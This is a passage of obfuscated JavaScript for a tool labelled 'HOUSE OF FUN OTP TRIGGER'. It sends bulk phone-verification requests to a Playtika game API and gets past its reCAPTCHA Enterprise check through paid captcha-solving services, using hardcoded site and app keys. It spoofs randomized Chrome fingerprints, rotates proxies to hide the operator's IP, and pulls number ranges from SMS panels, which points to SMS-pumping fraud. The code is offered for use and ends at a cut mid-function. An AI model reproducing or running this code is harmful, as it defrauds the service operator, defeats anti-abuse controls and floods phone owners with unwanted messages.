v26.v = 0x97, v26.buildMin = 0x1db0, v26.buildMax = 0x1de1, v26.grease = "\"Not=A?Brand\";v=\"8\"";
const v27 = {};
v27.v = 0x98, v27.buildMin = 0x1de2, v27.buildMax = 0x1e13, v27.grease = "\"Not?A_Brand\";v=\"99\"";
const v28 = {};
v28.v = 0x99, v28.buildMin = 0x1e14, v28.buildMax = 0x1e46, v28.grease = "\"Not_A Brand\";v=\"8\"";
const CHROME_VERSIONS = [v1, v2, v3, v4, v5, v6, v7, v8, v9, v10, v11, v12, v13, v14, v15, v16, v17, v18, v19, v20, v21, v22, v23, v24, v25, v26, v27, v28];
function getRandomClient() {
  const v179 = CHROME_VERSIONS;
  const v180 = Math.random() < 0.7,
    v181 = v180 ? v179.slice(0xe) : v179,
    v182 = v181[Math.floor(Math.random() * v181.length)],
    v183 = Math.floor(Math.random() * (v182.buildMax - v182.buildMin + 0x1)) + v182.buildMin,
    v184 = Math.floor(Math.random() * 0xc8) + 0x1,
    v185 = Math.random() < 0.3,
    v186 = !v185 && Math.random() < 0.5;
  let v187, v188, v189;
  if (v185) v187 = "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"macOS\"", v189 = "\"10.15.7\"";else v186 ? (v187 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"Windows\"", v189 = "\"15.0.0\"") : (v187 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/" + v182.v + ".0." + v183 + '.' + v184 + " Safari/537.36", v188 = "\"Windows\"", v189 = "\"10.0.0\"");
  const v190 = {};
  v190.userAgent = v187;
  return v190.secChUa = "\"Google Chrome\";v=\"" + v182.v + "\", \"Chromium\";v=\"" + v182.v + "\", " + v182.grease, v190.secChUaPlatform = v188, v190.secChUaPlatformVersion = v189, v190.chromeVersion = v182.v, v190;
}
function parseProxy(v191) {
  if (!v191) return null;
  if (typeof v191 === "object") return v191;
  v191 = v191.trim();
  if (!v191) return null;
  let v192, v193, v194, v195;
  if (v191.includes("://")) v191 = v191.split("://")[0x1];
  if (v191.includes('@')) {
    const v197 = v191.split('@'),
      v198 = v197[0x0].split(':'),
      v199 = v197[0x1].split(':');
    v194 = v198[0x0], v195 = v198[0x1], v192 = v199[0x0], v193 = parseInt(v199[0x1]);
  } else {
    const v200 = v191.split(':');
    if (v200.length === 0x2) v192 = v200[0x0], v193 = parseInt(v200[0x1]);else {
      if (v200.length === 0x4) !isNaN(parseInt(v200[0x3])) && isNaN(parseInt(v200[0x1])) ? (v194 = v200[0x0], v195 = v200[0x1], v192 = v200[0x2], v193 = parseInt(v200[0x3])) : (v192 = v200[0x0], v193 = parseInt(v200[0x1]), v194 = v200[0x2], v195 = v200[0x3]);else v200.length === 0x3 && (v192 = v200[0x0], v193 = parseInt(v200[0x1]), v194 = v200[0x2]);
    }
  }
  if (!v192 || !v193) return null;
  const v196 = {};
  v196.type = "http", v196.host = v192, v196.port = v193, v196.user = v194, v196.pass = v195, v196.original = v191;
  return v196;
}
function rotateSessionId(v201) {
  if (!v201 || !v201.user) return v201;
  const v202 = {
      ...v201
    },
    v203 = v202;
  if (v203.user.includes("-ssid-")) {
    const v204 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
    v203.user = v203.user.replace(/-ssid-[A-Za-z0-9_]+/, "-ssid-" + v204);
  } else {
    if (v203.user.includes("-session-")) {
      const v205 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
      v203.user = v203.user.replace(/-session-[A-Za-z0-9_]+/, "-session-" + v205);
    } else {
      if (/_sid_/i.test(v203.user)) {
        const v206 = crypto.randomBytes(0x6).toString("base64").replace(/[+/=]/g, '').substring(0x0, 0xa);
        v203.user = v203.user.replace(/_sid_[A-Za-z0-9]+/i, "_sid_" + v206);
      }
    }
  }
  return v203;
}
function createProxyAgent(v207) {
  if (!v207) return null;
  const v208 = typeof v207 === "string" ? parseProxy(v207) : v207;
  if (!v208) return null;
  let v209 = '';
  return v208.type === "socks5" || v208.type === "socks4" ? (v209 = "socks5://" + (v208.user ? encodeURIComponent(v208.user) + ':' + encodeURIComponent(v208.pass || '') + '@' : '') + v208.host + ':' + v208.port, new SocksProxyAgent(v209)) : (v209 = "http://" + (v208.user ? encodeURIComponent(v208.user) + ':' + encodeURIComponent(v208.pass || '') + '@' : '') + v208.host + ':' + v208.port, new HttpsProxyAgent(v209));
}
function sendRequest(v210, v211, v212, v213, v214 = null, v215 = 0x4e20) {
  return new Promise((v216, v217) => {
    const v218 = new URL(v210),
      v219 = {
        ...v212
      };
    let v220 = v219;
    if (!v220["Accept-Encoding"]) v220["Accept-Encoding"] = "gzip, deflate, br";
    if (v213) v220["Content-Length"] = Buffer.byteLength(v213);
    const v221 = {};
    v221.hostname = v218.hostname, v221.path = v218.pathname + v218.search, v221.method = v211, v221.headers = v220, v221.timeout = v215;
    const v222 = v221;
    if (v214) {
      const v224 = typeof v214 === "object" ? v214 : parseProxy(v214);
      if (!v224 || isNaN(v224.port) || v224.port <= 0x0) return v217(new Error("FATAL: Invalid proxy. Aborting to prevent IP leak."));
      v222.agent = createProxyAgent(v224);
    }
    const v223 = https.request(v222, v225 => {
      const v226 = [];
      v225.on("data", v227 => v226.push(v227)), v225.on("error", v217);
      v225.on("end", () => {
        let v228 = Buffer.concat(v226);
        const v229 = v225.headers["content-encoding"];
        if (v229 === "gzip") try {
          v228 = zlib.gunzipSync(v228);
        } catch (v230) {} else {
          if (v229 === "deflate") try {
            v228 = zlib.inflateSync(v228);
          } catch (v231) {} else {
            if (v229 === 'br') try {
              v228 = zlib.brotliDecompressSync(v228);
            } catch (v232) {}
          }
        }
        v216({
          'status': v225.statusCode,
          'data': v228.toString("utf8"),
          'headers': v225.headers
        });
      });
    });
    v223.on("error", v217), v223.on("timeout", () => {
      v223.destroy();
      v217(new Error("timeout"));
    });
    if (v213) v223.write(v213);
    v223.end();
  });
}
(function () {
  const fn3 = function () {
    let v234;
    try {
      v234 = Function("return (function() {}.constructor(\"return this\")( ));")();
    } catch (v235) {
      v234 = window;
    }
    return v234;
  };
  const v233 = fn3();
  v233.setInterval(fn2, 0xdac);
})();
function antiCaptchaSolve(v236, v237, v238) {
  return new Promise(async (v239, v240) => {
    try {
      const v241 = {};
      v241.type = "RecaptchaV3TaskProxyless", v241.websiteURL = v237, v241.websiteKey = v238, v241.minScore = 0.8, v241.pageAction = "CREATE_VERIFICATION_WEB", v241.isEnterprise = true;
      const v242 = {};
      v242.clientKey = v236, v242.task = v241;
      const v243 = JSON.stringify(v242),
        v244 = {};
      v244["Content-Type"] = "application/json", v244.Accept = "application/json";
      const v245 = await sendRequest("https://api.anti-captcha.com/createTask", "POST", v244, v243, null, 0x7530),
        v246 = JSON.parse(v245.data);
      if (v246.errorId !== 0x0 || !v246.taskId) return v240(new Error("AntiCaptcha create failed: " + (v246.errorDescription || "Unknown")));
      const v247 = v246.taskId,
        v248 = Date.now() + 0x1d4c0,
        fn4 = async () => {
          if (Date.now() > v248) return v240(new Error("AntiCaptcha timeout (120s)"));
          await new Promise(v254 => setTimeout(v254, 0x1388));
          const v249 = {};
          v249.clientKey = v236, v249.taskId = v247;
          const v250 = JSON.stringify(v249);
          const v251 = {};
          v251["Content-Type"] = "application/json";
          const v252 = await sendRequest("https://api.anti-captcha.com/getTaskResult", "POST", v251, v250, null, 0x4e20),
            v253 = JSON.parse(v252.data);
          if (v253.status === "ready") {
            const v255 = {};
            return v255.token = v253.solution.gRecaptchaResponse, v255.userAgent = v253.solution.userAgent || '', v239(v255);
          } else return v253.status === "processing" ? fn4() : v240(new Error("AntiCaptcha error: " + JSON.stringify(v253)));
        };
      fn4();
    } catch (v256) {
      v240(v256);
    }
  });
}
function twoCaptchaSolve(v257, v258, v259) {
  return new Promise(async (v260, v261) => {
    try {
      const v262 = "https://2captcha.com/in.php?key=" + v257 + "&method=userrecaptcha&googlekey=" + v259 + "&pageurl=" + encodeURIComponent(v258) + "&version=v3&action=" + "CREATE_VERIFICATION_WEB" + "&min_score=0.9&json=1&enterprise=1",
        v263 = {};
      v263.Accept = "application/json";
      const v264 = await sendRequest(v262, "GET", v263, null, null, 0x4e20),
        v265 = JSON.parse(v264.data);
      if (v265.status !== 0x1 || !v265.request) return v261(new Error("2Captcha submit failed: " + v265.request));
      const v266 = v265.request,
        v267 = Date.now() + 0x1d4c0,
        fn5 = async () => {
          if (Date.now() > v267) return v261(new Error("2Captcha timeout (120s)"));
          await new Promise(v272 => setTimeout(v272, 0x1388));
          const v268 = "https://2captcha.com/res.php?key=" + v257 + "&action=get&id=" + v266 + "&json=1";
          const v269 = {};
          v269.Accept = "application/json";
          const v270 = await sendRequest(v268, "GET", v269, null, null, 0x4e20),
            v271 = JSON.parse(v270.data);
          if (v271.status === 0x1) return v260(v271.request);else return v271.request === "CAPCHA_NOT_READY" ? fn5() : v261(new Error("2Captcha error: " + v271.request));
        };
      fn5();
    } catch (v273) {
      v261(v273);
    }
  });
}
const HOF_API_PATH = "/one-notification/api/1.0/verifications/phone?appKey=6f88e68b6c6d48c9ac32a485b426a9b9";
async function sendOTPWithToken(v274, v275, v276, v277, v278 = 0x61a8) {
  const v279 = normalizePhoneNumber(v274);
  try {
    const v280 = {};
    v280.verificationAddress = v279, v280.captchaSiteKey = "6LdqhWsgAAAAAL22OE2Smqvj-a_Nh2XsVjK-gK_j", v280.response = v275, v280.captchaVersion = "enterprise", v280.expectedAction = "CREATE_VERIFICATION_WEB";
    const v281 = JSON.stringify(v280),
      v282 = v276.match(/Chrome\/(\d+)/),
      v283 = v282 ? v282[0x1] : "153",
      v284 = v276.includes("Macintosh"),
      v285 = v276.includes("Linux"),
      v286 = v284 ? "\"macOS\"" : v285 ? "\"Linux\"" : "\"Windows\"",
      v287 = CHROME_VERSIONS.find(v296 => v296.v === parseInt(v283)),
      v288 = v287 ? v287.grease : "\"Not_A Brand\";v=\"8\"",
      v289 = "\"Google Chrome\";v=\"" + v283 + "\", " + v288 + ", \"Chromium\";v=\"" + v283 + '\x22',
      v290 = {};
    v290.accept = "*/*", v290["accept-encoding"] = "gzip, deflate, br, zstd", v290["accept-language"] = "en-US,en;q=0.9", v290["content-type"] = "application/json; charset=UTF-8", v290.origin = "https://trs-cdn-akm.playtika.com", v290.priority = "u=1, i", v290.referer = "https://trs-cdn-akm.playtika.com/", v290["sec-ch-ua"] = v289, v290["sec-ch-ua-mobile"] = '?0', v290["sec-ch-ua-platform"] = v286, v290["sec-fetch-dest"] = "empty", v290["sec-fetch-mode"] = "cors", v290["sec-fetch-site"] = "same-site", v290["user-agent"] = v276, v290["x-one-connect-client-version"] = "1.7.35";
    const v291 = v290,
      v292 = await sendRequest("https://one-zuul.playtika.com" + HOF_API_PATH, "POST", v291, v281, v277, v278);
    debugLog(v279, "otp-response", v292.data);
    if (v292.status === 0xc9 || v292.status === 0xc8) {
      let v297 = {};
      try {
        v297 = JSON.parse(v292.data);
      } catch (v298) {}
      if (v297.verificationId) {
        const v299 = {};
        return v299.success = true, v299.message = "OTP Triggered", v299.phone = v279, v299.verificationId = v297.verificationId, v299.tokenExpired = false, v299;
      }
    }
    const v293 = {};
    v293.success = false, v293.message = "Rate Limited (429)", v293.phone = v279, v293.tokenExpired = true;
    if (v292.status === 0x1ad) return v293;
    if (v292.status === 0x190) {
      let v300 = {};
      try {
        v300 = JSON.parse(v292.data);
      } catch (v303) {}
      const v301 = v300.message || v300.error || '';
      if (v301 === "CAPTCHA_FAILED") {
        const v304 = {};
        return v304.success = false, v304.message = "CAPTCHA_FAILED", v304.phone = v279, v304.tokenExpired = true, v304;
      }
      const v302 = {};
      return v302.success = false, v302.message = "Bad Request: " + v301, v302.phone = v279, v302.tokenExpired = true, v302;
    }
    let v294 = {};
    try {
      v294 = JSON.parse(v292.data);
    } catch (v305) {}
    const v295 = {};
    return v295.success = false, v295.message = v294.message || v294.error || "HTTP " + v292.status, v295.phone = v279, v295.tokenExpired = true, v295;
  } catch (v306) {
    const v307 = {};
    return v307.success = false, v307.message = v306.message, v307.phone = v279, v307.tokenExpired = false, v307;
  }
}
async function solveCaptcha(v308, v309) {
  const v310 = getRandomClient();
  let v311;
  for (let v312 = 0x1; v312 <= 0x3; v312++) {
    try {
      let v313 = '',
        v314 = '';
      if (v308 === "anticaptcha") {
        const v317 = await antiCaptchaSolve(v309, "https://trs-cdn-akm.playtika.com", "6LdqhWsgAAAAAL22OE2Smqvj-a_Nh2XsVjK-gK_j");
        v313 = v317.token, v314 = v317.userAgent;
      } else v313 = await twoCaptchaSolve(v309, "https://trs-cdn-akm.playtika.com", "6LdqhWsgAAAAAL22OE2Smqvj-a_Nh2XsVjK-gK_j");
      const v315 = v314 || v310.userAgent,
        v316 = {};
      return v316.captchaToken = v313, v316.activeUA = v315, v316;
    } catch (v318) {
      v311 = v318;
      if (v312 < 0x3) await new Promise(v319 => setTimeout(v319, 0xbb8));
    }
  }
  throw v311;
}
if (isMainThread) {
  class Dashboard {
    constructor(v320) {
      this.totalNumbers = v320;
      this.processed = 0x0, this.successful = 0x0;
      this.failed = 0x0, this.startTime = Date.now();
    }
    ["addLog"](v321, v322) {
      let v323 = '';
      if (v322 === "success") v323 = chalk.hex("#9B59B6").bold(" ✦ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#9B59B6")("OTP Sent") + chalk.hex("#555555")(" → ") + chalk.hex("#F1C40F").bold(v321.replace("Triggered OTP for ", ''));else {
        if (v322 === "retry") v323 = chalk.hex("#F1C40F").bold(" ↻ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#F1C40F")(v321);else {
          const v324 = v321.match(/\+?\d{7,}/),
            v325 = v324 ? v324[0x0] : '',
            v326 = v321.replace(/Failed on \S+: /, '').replace(/Fatal error on \S+: /, '');
          v323 = chalk.hex("#FF4466").bold(" ✗ NOT REXY") + chalk.hex("#555555")(" │ ") + chalk.hex("#FF4466")(v325 ? '' + v325 : '') + chalk.hex("#555555")(v325 ? " → " : '') + chalk.hex("#888888")(v326);
        }
      }
      process.stdout.write("\r[K" + v323 + '\x0a'), this.render();
    }
    ["setStatus"](v327) {}
    ["update"]() {}
    ["render"]() {
      const v328 = this.processed / Math.max(this.totalNumbers, 0x1),
        v329 = (v328 * 0x64).toFixed(0x1);
      const v330 = Math.round(v328 * 0x14),
        v331 = 0x14 - v330;
      const v332 = chalk.hex("#9B59B6")('█'.repeat(v330)) + chalk.hex("#333333")('░'.repeat(v331)),
        v333 = '\x20\x20' + chalk.hex("#9B59B6").bold("NOT REXY") + chalk.hex("#555555")(" ⮞ ") + v332 + chalk.hex("#888888")('\x20' + v329 + '%') + chalk.hex("#555555")("  │  ") + chalk.hex("#9B59B6").bold('✓\x20' + this.successful) + chalk.hex("#555555")('\x20\x20') + chalk.hex("#FF4466").bold('✗\x20' + this.failed) + chalk.hex("#555555")("  [" + this.processed + '/' + this.totalNumbers + ']');
      process.stdout.write("\r[K" + v333);
    }
    ["stop"]() {
      process.stdout.write("[2K\r\n");
      const v334 = Math.floor((Date.now() - this.startTime) / 0x3e8),
        v335 = Math.floor(v334 / 0x3c),
        v336 = v334 % 0x3c,
        v337 = v335 + 'm\x20' + v336 + 's';
      console.log(C("  ╔════════════════════════════════════════════╗")), console.log(C("  ║") + W.bold("  HOUSE OF FUN OTP TRIGGER — COMPLETE       ") + C('║')), console.log(C("  ╠════════════════════════════════════════════╣")), console.log(C("  ║") + ('\x20\x20' + chalk.greenBright("Successful") + "   " + chalk.greenBright(String(this.successful).padStart(0x6)) + "                       ") + C('║')), console.log(C("  ║") + ('\x20\x20' + chalk.red("Failed") + "       " + chalk.red(String(this.failed).padStart(0x6)) + "                       ") + C('║'));
      console.log(C("  ║") + ('\x20\x20' + chalk.cyan("Total Time") + "   " + chalk.cyan(v337.padEnd(0x6)) + "                       ") + C('║'));
      console.log(C("  ╚════════════════════════════════════════════╝\n"));
    }
  }
  async function selectOption(v338, v339) {
    return new Promise(v340 => {
      let v341 = 0x0;
      process.stdin.resume(), readline.emitKeypressEvents(process.stdin);
      if (process.stdin.isTTY) process.stdin.setRawMode(true);
      const fn6 = () => {
        process.stdout.write("[2J[H"), printHeader();
        console.log("   [33m" + v338 + "[0m\n"), v339.forEach((v342, v343) => {
          if (function (v344, v345) {
            return v344 === v345;
          }(v343, v341)) console.log("   [36m➔[35m " + v342.name + "[0m");else console.log("     [90m" + v342.name + "[0m");
        });
      };
      fn6();
      const fn7 = (v346, v347) => {
        if (v347.ctrl && v347.name === 'c') process.exit(0x0);
        if (v347.name === 'up') v341 = (v341 - 0x1 + v339.length) % v339.length, fn6();else {
          if (v347.name === "down") v341 = (v341 + 0x1) % v339.length, fn6();else v347.name === "return" && (process.stdin.setRawMode(false), process.stdin.removeListener("keypress", fn7), v340(v339[v341].value));
        }
      };
      process.stdin.on("keypress", fn7);
    });
  }
  async function promptText(v348, v349) {
    return new Promise(v350 => {
      process.stdout.write("   [33m" + v348 + "[0m ");
      let v351 = '';
      if (process.stdin.isTTY) process.stdin.setRawMode(false);
      process.stdin.resume();
      const fn8 = v352 => {
        const v353 = v352.toString();
        if (v353.includes('\x0a') || v353.includes('\x0d')) {
          process.stdin.removeListener("data", fn8), v351 += v353.split(/[\r\n]/)[0x0];
          let v354 = v351.trim();
          if (v354.startsWith('\x22') && v354.endsWith('\x22')) v354 = v354.slice(0x1, -1);
          v350(v354 || v349);
        } else v351 += v353;
      };
      process.stdin.on("data", fn8);
    });
  }
  const ANTICAPTCHA_KEY_FILE = path.join(__dirname, "anticaptcha_key.txt"),
    TWOCAPTCHA_KEY_FILE = path.join(__dirname, "twocaptcha_key.txt");
  async function interactiveWizard() {
    let v355 = 0x1,
      v356 = "file",
      v357 = "numbers.txt",
      v358 = null,
      v359 = null,
      v360 = null,
      v361 = null,
      v362 = "none",
      v363 = 0x14,
      v364 = "anticaptcha";
    let v365 = '';
    const v366 = path.join(__dirname, ".nexa_api_key");
    while (true) {
      process.stdout.write("[2J[H"), printHeader();
      if (v355 === 0x1) {
        const v367 = {};
        v367.name = "🔑 2Captcha   (2captcha.com)", v367.value = "twocaptcha";
        const v368 = await selectOption("SELECT CAPTCHA SOLVER (reCAPTCHA Enterprise)", [{
          'name': "🔑 AntiCaptcha (anti-captcha.com)",
          'value': "anticaptcha"
        }, v367, {
          'name': "❌ Exit Program",
          'value': "exit"
        }]);
        if (v368 === "exit") process.exit(0x0);
        v364 = v368;
        const v369 = v364 === "anticaptcha" ? ANTICAPTCHA_KEY_FILE : TWOCAPTCHA_KEY_FILE,
          v370 = v364 === "anticaptcha" ? "AntiCaptcha" : "2Captcha";
        if (fs.existsSync(v369)) {
          const v371 = fs.readFileSync(v369, "utf8").trim(),
            v372 = {};
          v372.name = "Yes, use saved key", v372.value = "use";
          const v373 = await selectOption(v370 + " key found (..." + v371.slice(-6) + "). Use it?", [v372, {
            'name': "No, enter new key",
            'value': "new"
          }, {
            'name': "Delete saved key",
            'value': "delete"
          }]);
          if (v373 === "use") v365 = v371;else v373 === "delete" && (fs.unlinkSync(v369), v365 = '');
        }
        if (!v365) {
          v365 = await promptText("Enter " + v370 + " API Key:", '');
          if (v365) {
            const v374 = {};
            v374.name = "Yes", v374.value = "yes";
            const v375 = {};
            v375.name = 'No', v375.value = 'no';
            const v376 = await selectOption("Save key for future use?", [v374, v375]);
            if (v376 === "yes") fs.writeFileSync(v369, v365, "utf8");
          }
        }
        if (!v365) continue;
        v355 = 0x2;
      } else {
        if (v355 === 0x2) {
          const v377 = {};
          v377.name = "📁 Load from file (numbers.txt)", v377.value = "file";
          const v378 = {};
          v378.name = "🌐 Auto fetch from NexaOTP Panel", v378.value = "nexa";
          const v379 = {};
          v379.name = "⚡ Auto fetch from Voltx (2oo9)", v379.value = "voltx";
          const v380 = {};
          v380.name = "🔥 Auto fetch from Stex (2oo9)", v380.value = "stex";
          const v381 = {};
          v381.name = "📱 Auto fetch from SMS Bower", v381.value = "smsbower";
          const v382 = {};
          v382.name = "⚡ Auto fetch from Zenex", v382.value = "zenex";
          const v383 = {};
          v383.name = "⬅️  Back to Captcha Selection", v383.value = "back";
          const v384 = {};
          v384.name = "❌ Exit Program", v384.value = "exit";
          const v385 = await selectOption("SELECT NUMBER SOURCE", [v377, v378, v379, v380, v381, v382, v383, v384]);
          if (v385 === "exit") process.exit(0x0);
          if (v385 === "back") {
            v355 = 0x1, v365 = '';
            continue;
          }
          v356 = v385, v355 = 0x3;
        } else {
          if (v355 === 0x3) {
            if (v356 === "voltx" || v356 === "stex") {
              const v386 = v356 === "voltx" ? "Voltx ⚡" : "Stex 🔥",
                v387 = v356 === "voltx" ? VOLTX_KEY_FILE : STEX_KEY_FILE,
                v388 = v356 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/getnum" : "/MXS47FLFX0U/tness/@public/api/getnum",
                v389 = v356 === "voltx" ? "/MXS47FLFX0U/tnevs/@public/api/console" : "/MXS47FLFX0U/tness/@public/api/console";
              let v390 = '',
                v391 = [],
                v392 = 0x32,
                v393 = false,
                v394 = 0x1;
              while (v394 <= 0x3 && !v393) {
                process.stdout.write("[2J[H"), printHeader();
                if (v394 === 0x1) {
                  if (fs.existsSync(v387)) {
                    v390 = fs.readFileSync(v387, "utf8").trim();
                    const v395 = {};
                    v395.name = "Enter new key", v395.value = "new";
                    const v396 = {};
                    v396.name = "⬅️ Back", v396.value = "back";
                    const v397 = await selectOption(v386 + " key found (" + v390.substring(0x0, 0xa) + "...)", [{
                      'name': "Use saved key",
                      'value': "use"
                    }, v395, {
                      'name': "Remove saved key",
                      'value': "remove"
                    }, v396]);
                    if (v397 === "back") {
                      v393 = true;
                      break;
                    }
                    if (v397 === "remove") fs.existsSync(v387) && fs.unlinkSync(v387), v390 = '';else {
                      if (v397 === "new") v390 = '';
                    }
                  }
                  if (!v390) {
                    const v398 = await promptText("Enter " + v386 + " API Key (mauthapi):", '');
                    if (v398.toLowerCase() === "back") {
                      v393 = true;
                      break;
                    }
                    v390 = v398;
                    const v399 = {};
                    v399.name = "Yes", v399.value = "yes";
                    const v400 = {};
                    v400.name = 'No', v400.value = 'no';
                    const v401 = await selectOption("Save key?", [v399, v400]);
                    if (v401 === "yes" && v390) fs.writeFileSync(v387, v390, "utf8");
                  }
                  if (v390) v394 = 0x2;
                } else {
                  if (v394 === 0x2) {
                    const v402 = {};
                    v402.name = "✏️  Enter manually", v402.value = "manual";
                    const v403 = {};
                    v403.name = "⬅️ Back", v403.value = "back";
                    const v404 = await selectOption("How to select ranges?", [{
                      'name': "🔍 Auto Range Finder (scan console)",
                      'value': "auto"
                    }, v402, v403]);
                    if (v404 === "back") {
                      v394 = 0x1;
                      continue;
                    }
                    if (v404 === "auto") {
                      const v405 = await autoRangeFinderFor2Oo(v390, v389, selectOption, promptText);
                      v405 && v405.length > 0x0 && (v391 = v405, v394 = 0x3);
                    } else {
                      v391 = [];
                      let v406 = true;
                      while (v406) {
                        const v407 = await promptText("Enter range #" + (v391.length + 0x1) + " (e.g. 26134XXX) or 'back':", '');
                        if (v407.toLowerCase() === "back") {
                          if (v391.length === 0x0) break;else {
                            v391.pop();
                            continue;
                          }
                        }
                        if (v407) v391.push(v407);
                        const v408 = {};
                        v408.name = "Yes", v408.value = "yes";
                        const v409 = {};
                        v409.name = 'No', v409.value = 'no';
                        const v410 = await selectOption("Added " + v391.length + ". Add another?", [v408, v409]);
                        if (v410 === 'no') v406 = false;
                      }
                      if (v391.length > 0x0) v394 = 0x3;
                    }
                  } else {
                    if (v394 === 0x3) {
                      const v411 = await promptText("How many numbers? [default:50]:", '50');
                      if (v411.toLowerCase() === "back") {
                        v394 = 0x2;
                        continue;
                      }
                      v392 = parseInt(v411) || 0x32;
                      const v412 = {};
                      v412.provider = v356, v412.apiKey = v390, v412.getPath = v388, v412.consolePath = v389, v412.ranges = v391, v412.totalCount = v392, v361 = v412, v358 = null, v394 = 0x4;
                    }
                  }
                }
              }
              if (v393) {
                v355 = 0x2;
                continue;
              }
              v355 = 0x4;
            } else {
              if (v356 === "smsbower") {
                let v413 = '',
                  v414 = 'fb',
                  v415 = '0',
                  v416 = "0.5",
                  v417 = 0x32,
                  v418 = 0x1,
                  v419 = false;
                while (v418 <= 0x4 && !v419) {
                  process.stdout.write("[2J[H"), printHeader();
                  if (v418 === 0x1) {
                    if (fs.existsSync(SMSBOWER_KEY_FILE)) {
                      v413 = fs.readFileSync(SMSBOWER_KEY_FILE, "utf8").trim();
                      const v420 = {};
                      v420.name = "Enter new key", v420.value = "new";
                      const v421 = {};
                      v421.name = "Remove saved key", v421.value = "remove";
                      const v422 = await selectOption("SMS Bower key found (" + v413.substring(0x0, 0xa) + "...)", [{
                        'name': "Use saved key",
                        'value': "use"
                      }, v420, v421, {
                        'name': "⬅️ Back",
                        'value': "back"
                      }]);
                      if (v422 === "back") {
                        v419 = true;
                        break;
                      }
                      if (v422 === "remove") fs.existsSync(SMSBOWER_KEY_FILE) && fs.unlinkSync(SMSBOWER_KEY_FILE), v413 = '';else {
                        if (v422 === "new") v413 = '';
                      }
                    }
                    if (!v413) {
                      v413 = await promptText("Enter SMS Bower API Key:", '');
                      if (v413.toLowerCase() === "back") {
                        v419 = true;
                        break;
                      }
                      const v423 = {};
                      v423.name = "Yes", v423.value = "yes";
                      const v424 = {};
                      v424.name = 'No', v424.value = 'no';
                      const v425 = await selectOption("Save key?", [v423, v424]);
                      if (v425 === "yes" && v413) fs.writeFileSync(SMSBOWER_KEY_FILE, v413, "utf8");
                    }
                    if (v413) v418 = 0x2;
                  } else {
                    if (v418 === 0x2) {
                      v414 = await promptText("Service code (e.g. fb, ig, wa) [default: fb]:", 'fb');
                      if (v414.toLowerCase() === "back") {
                        v418 = 0x1;
                        continue;
                      }
                      v414 = v414 || 'fb', v418 = 0x3;
                    } else {
                      if (v418 === 0x3) {
                        v415 = await promptText("Country code (0 = any) [default: 0]:", '0');
                        if (v415.toLowerCase() === "back") {
                          v418 = 0x2;
                          continue;
                        }
                        v415 = v415 || '0';
                        const v426 = await promptText("Max price per number [default: 0.5]:", "0.5");
                        v416 = v426 || "0.5", v418 = 0x4;
                      } else {
                        if (v418 === 0x4) {
                          const v427 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v427.toLowerCase() === "back") {
                            v418 = 0x3;
                            continue;
                          }
                          v417 = parseInt(v427) || 0x32;
                          const v428 = {};
                          v428.apiKey = v413, v428.service = v414, v428.country = v415, v428.maxPrice = v416, v428.totalCount = v417, v359 = v428, v358 = null, v361 = null, v360 = null, v418 = 0x5;
                        }
                      }
                    }
                  }
                }
                if (v419) {
                  v355 = 0x2;
                  continue;
                }
                v355 = 0x4;
              } else {
                if (v356 === "zenex") {
                  let v429 = '',
                    v430 = [],
                    v431 = 0x32,
                    v432 = 0x1,
                    v433 = false;
                  while (v432 <= 0x3 && !v433) {
                    process.stdout.write("[2J[H"), printHeader();
                    if (v432 === 0x1) {
                      if (fs.existsSync(ZENEX_KEY_FILE)) {
                        v429 = fs.readFileSync(ZENEX_KEY_FILE, "utf8").trim();
                        const v434 = {};
                        v434.name = "Enter new key", v434.value = "new";
                        const v435 = {};
                        v435.name = "Remove saved key", v435.value = "remove";
                        const v436 = await selectOption("Zenex key found (" + v429.substring(0x0, 0xa) + "...)", [{
                          'name': "Use saved key",
                          'value': "use"
                        }, v434, v435, {
                          'name': "⬅️ Back",
                          'value': "back"
                        }]);
                        if (v436 === "back") {
                          v433 = true;
                          break;
                        }
                        if (v436 === "remove") fs.existsSync(ZENEX_KEY_FILE) && fs.unlinkSync(ZENEX_KEY_FILE), v429 = '';else {
                          if (v436 === "new") v429 = '';
                        }
                      }
                      if (!v429) {
                        v429 = await promptText("Enter Zenex API Key (mapikey):", '');
                        if (v429.toLowerCase() === "back") {
                          v433 = true;
                          break;
                        }
                        const v437 = {};
                        v437.name = "Yes", v437.value = "yes";
                        const v438 = {};
                        v438.name = 'No', v438.value = 'no';
                        const v439 = await selectOption("Save key?", [v437, v438]);
                        if (v439 === "yes" && v429) fs.writeFileSync(ZENEX_KEY_FILE, v429, "utf8");
                      }
                      if (v429) v432 = 0x2;
                    } else {
                      if (v432 === 0x2) {
                        v430 = [];
                        let v440 = true;
                        while (v440) {
                          const v441 = await promptText("Enter range #" + (v430.length + 0x1) + " (e.g. 4473845XXX) or 'back':", '');
                          if (v441.toLowerCase() === "back") {
                            if (v430.length === 0x0) {
                              v433 = true;
                              break;
                            } else {
                              v430.pop();
                              continue;
                            }
                          }
                          if (v441) v430.push(v441);
                          const v442 = {};
                          v442.name = "Yes", v442.value = "yes";
                          const v443 = {};
                          v443.name = 'No', v443.value = 'no';
                          const v444 = await selectOption("Added " + v430.length + ". Add another?", [v442, v443]);
                          if (v444 === 'no') v440 = false;
                        }
                        if (v430.length > 0x0) v432 = 0x3;
                      } else {
                        if (v432 === 0x3) {
                          const v445 = await promptText("How many numbers? [default: 50]:", '50');
                          if (v445.toLowerCase() === "back") {
                            v432 = 0x2;
                            continue;
                          }
                          v431 = parseInt(v445) || 0x32;
                          const v446 = {};
                          v446.apiKey = v429, v446.ranges = v430, v446.totalCount = v431, v360 = v446, v358 = null, v361 = null, v359 = null, v432 = 0x4;
                        }
                      }
                    }
                  }
                  if (v433) {
                    v355 = 0x2;
                    continue;
                  }
                  v355 = 0x4;
                } else {
                  if (v356 === "file") {
